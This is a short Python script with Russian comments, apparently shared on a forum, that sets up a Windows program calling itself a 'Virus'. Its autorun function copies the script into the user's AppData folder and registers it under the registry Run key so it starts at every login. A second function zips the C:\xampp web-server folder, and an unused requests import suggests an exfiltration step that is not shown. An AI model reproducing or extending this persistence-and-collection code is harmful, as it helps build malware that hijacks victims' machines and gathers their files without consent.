import shutil
import os
import sys
import requests
from winreg import *


def autorun():
    # Путь, который будет светиться в авторане
    directory = os.getenv("APPDATA") + r'/your_program/'
    base_file = directory + os.path.basename(__file__)

    if not os.path.exists(directory):
        os.makedirs(directory)
        shutil.copy(__file__, base_file)

    # Путь в реестре
    path_to_reestr = OpenKey(HKEY_CURRENT_USER,
                     r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                     0, KEY_ALL_ACCESS)
    # Установить программу "Virus" в автозагрузку
    SetValueEx(path_to_reestr, 'Virus', 0, REG_SZ, base_file)
    # Закрыть реестр
    CloseKey(path_to_reestr)


def addToZip():
    # Добавляем папку в аврхив
	shutil.make_archive(r'C:\\file', 'zip', r'C:\xampp') #[/SPOILER]
	

